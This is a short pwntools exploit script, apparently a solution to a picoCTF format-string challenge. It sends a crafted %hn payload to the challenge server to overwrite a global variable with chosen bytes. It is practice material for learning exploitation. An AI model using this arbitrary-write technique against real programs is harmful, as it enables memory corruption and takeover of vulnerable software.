#!/usr/bin/python3

from pwn import *

# r = process('./format-string-2')
r = remote('rhea.picoctf.net', 61179)

sus_addr = 0x404060

payload = f'%{0x6761}c%18$hn'.encode()
payload += f'%{0x6c66 - 0x6761}c%19$hn'.encode()
payload = payload.ljust(32, b'a')
payload += p64(sus_addr + 2)
payload += p64(sus_addr)

r.sendlineafter(b'say?\n', payload)

r.interactive()